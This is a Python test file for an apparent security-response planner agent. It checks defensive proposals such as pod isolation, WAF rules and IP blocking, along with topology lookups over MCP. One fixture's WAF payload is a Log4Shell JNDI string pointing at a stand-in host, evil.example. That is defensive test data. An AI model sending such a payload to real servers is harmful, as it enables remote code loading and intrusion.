from pathlib import Path

from agent_brain.agents import PlannerAgent
from agent_brain.integrations.mcp_client import TopologyMCPClient
from agent_brain.models import DebateState, SecurityEvent, Severity
from agent_brain.services import MockLLMClient


# 拓扑 mock server 路径，供启用 MCP 时的 local 模式使用
_TOPOLOGY_FIXTURE_PATH = (
    Path(__file__).resolve().parents[2] / "mcp-servers" / "topology-mcp-server"
)


def _build_state(event: SecurityEvent) -> DebateState:
    return DebateState(
        debateId=f"deb-{event.eventId}",
        securityEvent=event,
        retrievedContext=["historical ioc intel", "baseline response policy"],
    )


# ---------------------------------------------------------------------------
# 原回归测试：MCP 默认关闭时，行为与改造前完全一致
# ---------------------------------------------------------------------------


def test_planner_prefers_restrict_egress_and_isolate_for_spawn_shell():
    event = SecurityEvent(
        eventId="evt-shell-001",
        sourceType="EDR",
        subject="pod/payment-processor-abc",
        action="spawn_shell",
        object="/bin/sh",
        context={"namespace": "payments", "tenantId": "tenant-a"},
        severity=Severity.HIGH,
        riskScore=0.91,
        labels=["t1059"],
    )
    state = PlannerAgent(MockLLMClient()).run(_build_state(event))
    proposal = state.plannerProposal
    assert proposal is not None
    action_types = [a.type.value for a in proposal.actions]
    assert "RESTRICT_EGRESS" in action_types
    assert "ISOLATE_POD" in action_types
    assert proposal.threatType.value == "LATERAL_MOVEMENT"
    assert proposal.rationale
    # 默认 ENABLE_MCP=false：不会真的调用 MCP，metadata 走 disabled 分支
    assert state.plannerMetadata is not None
    assert state.plannerMetadata.topology_context_used is False
    assert state.plannerMetadata.mcp_tool_calls == []


def test_planner_prefers_waf_rule_for_log4j_signature():
    event = SecurityEvent(
        eventId="evt-log4j-001",
        sourceType="WAF",
        subject="public-gateway",
        action="http_request",
        object="/api/search",
        context={
            "payload": "${jndi:ldap://evil.example/a}",
            "srcIp": "203.0.113.10",
            "namespace": "edge",
        },
        severity=Severity.CRITICAL,
        riskScore=0.96,
        labels=["log4shell", "t1190"],
    )
    state = PlannerAgent(MockLLMClient()).run(_build_state(event))
    proposal = state.plannerProposal
    assert proposal is not None
    action_types = [a.type.value for a in proposal.actions]
    assert action_types[0] == "APPLY_WAF_RULE"
    assert "BLOCK_IP" in action_types
    assert proposal.targetLayer.value == "APPLICATION"
    # 稳定可序列化输出
    assert '"strategyId":"stg-evt-log4j-001-p1"' in proposal.model_dump_json()


# ---------------------------------------------------------------------------
# 新增测试：启用 MCP（local 模式）后 Planner 能拿到拓扑上下文并写入 metadata
# ---------------------------------------------------------------------------


def _make_mcp_planner() -> PlannerAgent:
    client = TopologyMCPClient(
        enabled=True, mode="local", server_path=_TOPOLOGY_FIXTURE_PATH
    )
    return PlannerAgent(MockLLMClient(), topology_client=client)


def test_planner_enriches_context_when_mcp_enabled():
    """事件中携带 dstIp 命中 db-primary-01 (CRITICAL) 时，应得到 HIGH blast。"""
    event = SecurityEvent(
        eventId="evt-mcp-001",
        sourceType="NETWORK",
        subject="pod/frontend-1",
        action="connect",
        object="db-primary-01",
        context={
            "srcIp": "10.10.1.10",  # dmz-web-01 (HIGH)
            "dstIp": "10.30.1.10",  # db-primary-01 (CRITICAL)
            "namespace": "payments",
        },
        severity=Severity.HIGH,
        riskScore=0.88,
        labels=["lateral"],
    )
    state = _make_mcp_planner().run(_build_state(event))
    md = state.plannerMetadata
    assert md is not None
    assert md.topology_context_used is True
    assert md.expected_blast_radius.value == "high"
    # affected_assets 至少应包含 src/dst 两个解析到的 asset
    assert "dmz-web-01" in md.affected_assets
    assert "db-primary-01" in md.affected_assets
    # 6 类调用都该出现：src/dst/get_neighbors/get_critical_assets/find_paths
    tool_names = [c.tool for c in md.mcp_tool_calls]
    assert tool_names.count("get_asset_info") >= 2
    assert "get_neighbors" in tool_names
    assert "get_critical_assets" in tool_names
    assert "find_paths" in tool_names
    # 每条调用都要有 server / summary
    for call in md.mcp_tool_calls:
        assert call.server == "topology-mcp-server"
        assert call.summary
    # rationale 中应能看到拓扑信号
    assert "topology_blast_radius=high" in state.plannerProposal.rationale
    # scope.assets 也已扩展到 dst/critical 资产
    assert "db-primary-01" in state.plannerProposal.scope.assets


def test_planner_records_mcp_error_when_server_path_missing():
    """server_path 不存在时，不应阻断流程，应在 metadata 写明 mcp_error。"""
    bad_client = TopologyMCPClient(
        enabled=True,
        mode="local",
        server_path="/nonexistent/topology-mcp-server",
    )
    planner = PlannerAgent(MockLLMClient(), topology_client=bad_client)
    event = SecurityEvent(
        eventId="evt-mcp-err-001",
        sourceType="NETWORK",
        subject="pod/frontend-2",
        action="connect",
        object="db-primary-01",
        context={"dstIp": "10.30.1.10", "namespace": "payments"},
        severity=Severity.HIGH,
        riskScore=0.7,
        labels=[],
    )
    state = planner.run(_build_state(event))
    md = state.plannerMetadata
    assert md is not None
    # 调用全部失败 -> topology_context_used 仍然为 False
    assert md.topology_context_used is False
    # 至少有一次失败 trace
    assert any(c.success is False for c in md.mcp_tool_calls)
    # mcp_error 应被记录
    assert md.mcp_error is not None
    # 但策略仍然被生成，没有被破坏
    assert state.plannerProposal is not None


def test_planner_skips_mcp_when_no_topology_keys():
    """事件没有 src/dst/asset 任何线索时，跳过 MCP 调用，metadata 为空。"""
    planner = _make_mcp_planner()
    event = SecurityEvent(
        eventId="evt-mcp-skip-001",
        sourceType="EDR",
        subject="pod/abc",
        action="file_write",
        object="/etc/passwd",
        context={"namespace": "payments"},
        severity=Severity.MEDIUM,
        riskScore=0.5,
        labels=[],
    )
    state = planner.run(_build_state(event))
    md = state.plannerMetadata
    assert md is not None
    assert md.topology_context_used is False
    assert md.mcp_tool_calls == []
    assert md.mcp_error is None  # 是"不需要"而不是"出错"
